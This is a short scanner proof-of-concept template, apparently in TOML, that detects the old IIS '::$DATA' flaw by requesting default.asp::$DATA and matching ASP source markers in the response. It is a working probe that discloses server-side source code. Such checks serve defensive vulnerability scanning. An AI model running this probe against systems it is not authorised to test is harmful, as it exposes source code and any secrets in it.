[info]
author = "ave"
description = "AVE-1999-0240 verification for IIS ::$DATA ASP source disclosure"
id = "POC-AVE-1999-0240"
name = "PoC for AVE-1999-0240"
severity = "medium"
tags = ["ave-1999-0240"]
vuln_id = ["AVE-1999-0240"]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/default.asp::$DATA"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "Server.CreateObject",
    "Response.Write",
]
